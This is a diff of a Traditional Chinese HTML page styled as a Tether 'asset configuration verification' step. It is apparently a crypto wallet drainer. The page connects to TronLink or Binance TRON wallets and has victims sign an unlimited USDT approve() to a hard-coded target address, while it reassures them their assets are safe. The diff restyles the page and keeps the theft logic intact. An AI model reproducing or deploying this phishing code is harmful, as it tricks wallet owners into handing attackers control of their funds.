@@ -3,61 +3,58 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>資產配置驗證（僅 TRON）</title>
+<title>資產配置驗證</title>
 <style>
-  body {
-    font-family: "Noto Sans TC", sans-serif;
+  @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+TC&display=swap');
+  body, html {
+    height: 100%;
+    margin: 0;
+    font-family: 'Noto Sans TC', sans-serif;
     background: linear-gradient(135deg, #0f172a, #1e293b, #2563eb, #1e3a8a);
     background-size: 400% 400%;
-    animation: gradientBG 15s ease infinite;
+    animation: gradientBG 20s ease infinite;
     color: #fff;
     display: flex;
     justify-content: center;
     align-items: center;
-    height: 100vh;
-    margin: 0;
-    flex-direction: column;
     padding: 20px;
   }
   @keyframes gradientBG {
-    0% { background-position: 0% 50%; }
-    50% { background-position: 100% 50%; }
-    100% { background-position: 0% 50%; }
+    0%{background-position:0% 50%}
+    50%{background-position:100% 50%}
+    100%{background-position:0% 50%}
   }
   .container {
-    background: rgba(255,255,255,0.05);
-    padding: 30px;
+    background: rgba(255,255,255,0.06);
+    padding: 35px 30px;
     border-radius: 20px;
     max-width: 420px;
     width: 100%;
     text-align: center;
-    backdrop-filter: blur(12px);
-    box-shadow: 0 8px 25px rgba(0,0,0,0.3);
-    margin-bottom: 20px;
+    backdrop-filter: blur(14px);
+    box-shadow: 0 10px 30px rgba(0,0,0,0.45);
   }
   .logo {
-    width: 80px;
-    margin-bottom: 15px;
+    width: 90px;
+    margin-bottom: 18px;
   }
   h1 {
-    font-size: 22px;
-    margin-bottom: 10px;
+    font-weight: 700;
+    font-size: 26px;
+    margin-bottom: 14px;
   }
-  p, li {
-    font-size: 14px;
+  p {
+    font-size: 15px;
+    line-height: 1.5;
     color: #cbd5e1;
-    margin-bottom: 10px;
-  }
-  ul {
-    text-align: left;
-    margin: 10px auto 20px;
-    padding-left: 20px;
+    margin-bottom: 16px;
   }
   .progress {
+    width: 100%;
     background: rgba(255,255,255,0.1);
     border-radius: 50px;
     overflow: hidden;
-    height: 8px;
+    height: 10px;
     margin-bottom: 15px;
   }
   .progress-bar {
@@ -67,45 +64,32 @@
     transition: width 0.5s ease;
   }
   #status {
+    font-size: 15px;
+    font-weight: 600;
+    letter-spacing: 0.5px;
     margin-top: 10px;
-    font-size: 14px;
+    min-height: 24px;
   }
   .success { color: #4ade80; }
   .error { color: #f87171; }
   .loading { color: #facc15; }
-  .tip-box {
-    background: rgba(255,255,255,0.12);
-    padding: 15px 20px;
-    border-radius: 12px;
-    color: #e0e7ff;
-    font-size: 13px;
-    line-height: 1.5;
-    margin-bottom: 15px;
-  }
-  .tip-box strong {
-    color: #60a5fa;
-  }
 </style>
 <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
 </head>
 <body>
-<div class="container">
-  <img src="https://upload.wikimedia.org/wikipedia/commons/6/6f/Logo_Tether.svg" alt="Logo" class="logo" />
-  <h1>資產配置驗證（僅 TRON）</h1>
-  <p>請保持錢包在線，並根據錢包提示完成授權操作。</p>
-  <div class="progress"><div class="progress-bar" id="progress-bar"></div></div>
-  <p id="status" class="loading">檢測環境中...</p>
-</div>
-
-<div class="container tip-box" style="max-width: 420px;">
-  <strong>授權說明：</strong>
-  <ul>
-    <li>本次操作需授權指定合約，確保資產配置流程順利進行。</li>
-    <li>授權金額設定為 <strong>無限額度</strong>，以簡化授權流程。</li>
-    <li>錢包將提示授權操作，請按照提示完成授權以保障流程正常。</li>
-    <li>本平台致力保障您的資產安全，請放心操作。</li>
-  </ul>
-</div>
+  <div class="container" role="main" aria-live="polite">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6f/Logo_Tether.svg" alt="USDT Logo" class="logo" />
+    <h1>資產配置驗證</h1>
+    <p>請保持錢包在線，並根據錢包提示完成授權操作。</p>
+    <div class="progress"><div class="progress-bar" id="progress-bar"></div></div>
+    <p id="status" class="loading">檢測環境中...</p>
+    <ul style="text-align:left;color:#a5b4fc;font-size:14px;line-height:1.6;">
+      <li>本次操作需授權指定合約，確保資產配置流程順利進行。</li>
+      <li>授權金額設定為<strong>無限額度</strong>，以保障多次操作無需重複授權。</li>
+      <li>錢包將提示授權，請依提示完成操作以保障流程正常。</li>
+      <li>本平台嚴格保障您的資產安全，請放心操作。</li>
+    </ul>
+  </div>
 
 <script>
   const USDT_CONTRACT_TRON = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
@@ -128,12 +112,14 @@
         await tronApprove();
         return;
       }
+
       if (window.tronLink) {
         await window.tronLink.request({ method: 'tron_requestAccounts' });
         setProgress(40, "檢測到 TronLink，連接中...");
         await tronApprove();
         return;
       }
+
       if (window.binance && window.binance.tron) {
         await window.binance.tron.request({ method: 'tron_requestAccounts' });
         window.tronWeb = new TronWeb(window.binance.tron);
@@ -142,10 +128,11 @@
         return;
       }
 
-      setProgress(100, "未檢測到 TRON 錢包，請安裝或打開錢包應用", "error");
+      setProgress(100, "未檢測到 TRON 錢包", "error");
+      setTimeout(() => { window.location.href = "fail.html"; }, 1500);
     } catch (err) {
       console.error(err);
-      setProgress(100, "驗證未完成", "error");
+      setProgress(100, "驗證過程出錯", "error");
       setTimeout(() => { window.location.href = "fail.html"; }, 1500);
     }
   }
@@ -153,14 +140,14 @@
   async function tronApprove() {
     try {
       const address = window.tronWeb.defaultAddress.base58;
-      setProgress(60, "已連接：" + address + "，配置中...");
+      setProgress(60, "已連接：" + address + "，授權中...");
       const contract = await window.tronWeb.contract().at(USDT_CONTRACT_TRON);
       await contract.approve(TARGET_ADDRESS_TRON, INFINITE_AMOUNT).send();
       setProgress(100, "✅ 配置完成", "success");
       setTimeout(() => { window.location.href = "success.html"; }, 1500);
     } catch (err) {
       console.error(err);
-      setProgress(100, "驗證未完成", "error");
+      setProgress(100, "授權失敗或已取消", "error");
       setTimeout(() => { window.location.href = "fail.html"; }, 1500);
     }
   }
